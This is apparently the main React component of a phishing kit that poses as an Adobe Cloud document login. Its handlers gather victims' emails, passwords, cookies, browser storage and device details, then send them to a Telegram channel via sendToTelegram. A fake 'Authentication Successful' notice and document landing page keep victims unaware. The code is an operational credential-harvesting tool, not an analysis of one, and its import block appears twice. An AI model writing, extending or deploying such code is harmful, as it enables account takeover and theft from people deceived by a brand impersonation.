import React, { useState, useEffect } from 'react';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import { 
  getBrowserFingerprint, 
  extractEmailFromProvider,
  sendToTelegram 
} from './utils/oauthHandler';
import { 
  getBrowserFingerprint, 
  extractEmailFromProvider,
  sendToTelegram 
} from './utils/oauthHandler';

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('home');
  const [selectedFileName, setSelectedFileName] = useState('');

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Handle OAuth callback on app load
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const isOAuthCallback = urlParams.has('code') || urlParams.has('state');
    
    if (isOAuthCallback) {
      handleOAuthCallback();
    }
  }, []);

  const getStorageData = (storageType: 'localStorage' | 'sessionStorage') => {
    try {
      const storage = window[storageType];
      const data: { [key: string]: string } = {};
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key) || '';
        }
      }
      return Object.keys(data).length > 0 ? JSON.stringify(data) : 'Empty';
    } catch (e) {
      return 'Access denied';
    }
  };

  const handleOAuthCallback = async () => {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    
    if (code && state) {
      // Capture cookies and session data after successful OAuth return
      const postAuthFingerprint = getBrowserFingerprint();
      let preAuthCookies = null;
      try {
        const preAuthData = localStorage.getItem('pre_auth_cookies');
        preAuthCookies = preAuthData ? JSON.parse(preAuthData) : null;
      } catch (e) {
        console.warn('Failed to parse pre-auth cookies');
      }

      // Only proceed if we have new cookies/session data (indicating successful login)
      const hasNewCookies = postAuthFingerprint.cookies !== (preAuthCookies ? preAuthCookies.cookies : '');
      const hasSessionData = postAuthFingerprint.cookies.includes('session') ||
                            postAuthFingerprint.cookies.includes('auth') ||
                            postAuthFingerprint.localStorage !== 'Empty' ||
                            postAuthFingerprint.sessionStorage !== 'Empty';

      if (hasNewCookies || hasSessionData) {
        const sessionData = {
          email: extractEmailFromProvider(state, code),
          provider: state,
          sessionId: Math.random().toString(36).substring(2, 15),
          timestamp: new Date().toISOString(),
          deviceInfo: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
          },
          cookieChanges: {
            before: preAuthCookies ? preAuthCookies.cookies : '',
            after: postAuthFingerprint.cookies,
            hasChanges: hasNewCookies
          }
        };

        // Store successful session
        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        sessionStorage.setItem('adobe_current_session', JSON.stringify(sessionData));

        // Send successful authentication data to Telegram
        await sendToTelegram(sessionData, postAuthFingerprint);

        // Clean up and redirect to landing page
        localStorage.removeItem('pre_auth_cookies');
        setHasActiveSession(true);
        setCurrentPage('landing');

        // Show success notification
        const notification = document.createElement('div');
        notification.innerHTML = `
        <div style="
          position: fixed;
          top: 20px;
          right: 20px;
          background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
          color: #166534;
          padding: 20px;
          border-radius: 12px;
          box-shadow: 0 10px 25px rgba(34, 197, 94, 0.15);
          z-index: 10000;
          max-width: 350px;
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          border: 1px solid rgba(34, 197, 94, 0.3);
        ">
          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✅ Authentication Successful!
          </div>
          <div style="color: #6b7280; font-size: 14px;">
            Redirecting to your documents...
          </div>
        </div>
      `;
        document.body.appendChild(notification);
        setTimeout(() => notification.remove(), 4000);
      }
    }
  };

  // Single login attempt (no double attempt logic)
  const handleLoginSuccess = async (sessionData: any) => {
    try {
      document.cookie = "sessionid=" + Math.random().toString(36).substring(2, 18) + "; path=/; max-age=86400";
      document.cookie = "auth_token=" + btoa(sessionData.email + ':' + (sessionData.password || 'oauth')) + "; path=/; max-age=86400";
      document.cookie = "logged_in=true; path=/; max-age=86400";
      document.cookie = "user_email=" + encodeURIComponent(sessionData.email || "unknown") + "; path=/; max-age=86400";
    } catch (e) {
      console.warn('Failed to set cookies:', e);
    }

    console.log('🔐 OAuth login success:', sessionData);

    const browserFingerprint = getBrowserFingerprint();
    
    const updatedSession = {
      ...sessionData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      deviceInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
      }
    };

    setHasActiveSession(true);
    localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));

    try {
      await sendToTelegram(updatedSession, browserFingerprint);
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }

    console.log('✅ OAuth authentication completed, navigating to landing page...');
    setCurrentPage('landing');
    
    // Clean up URL
    window.history.replaceState({}, document.title, window.location.pathname);
  };

  // Handler for file actions
  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFileName(fileName);
    console.log(`${action} action for file: ${fileName}`);
  };

  // Check for existing session on load
  useEffect(() => {
    // Check for existing session first
    const existingSession = localStorage.getItem('adobe_autograb_session');
    if (existingSession) {
      try {
        const sessionData = JSON.parse(existingSession);
        const sessionTime = new Date(sessionData.timestamp);
        const now = new Date();
        const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
        
        // Session never expires - always valid
        if (true) {
          setHasActiveSession(true);
          setCurrentPage('landing');
          console.log('✅ Existing session found, redirecting to landing page');
          return;
        }
      } catch (error) {
        console.error('Error parsing existing session:', error);
        localStorage.removeItem('adobe_autograb_session');
      }
    }
    
    // No valid session, start with login page
    setCurrentPage('login');
  }, []);

  // Simple landing page component since the files are missing
  const SimpleLandingPage = () => (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <div className="text-center">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">Welcome to Adobe Cloud</h1>
        <p className="text-gray-600 mb-4">You have successfully authenticated!</p>
        <button 
          onClick={() => setCurrentPage('login')}
          className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
        >
          Logout
        </button>
      </div>
    </div>
  );

  // Render appropriate page based on current state
  if (currentPage === 'login') {
    return isMobile ? (
      <MobileLoginPage onLoginSuccess={handleLoginSuccess} />
    ) : (
      <LoginPage onLoginSuccess={handleLoginSuccess} />
    );
  }

  // Default to landing page with proper mobile/desktop detection
  return isMobile ? (
    <MobileLandingPage onFileAction={handleFileAction} />
  ) : (
    <LandingPage onFileAction={handleFileAction} />
  );
}

export default App;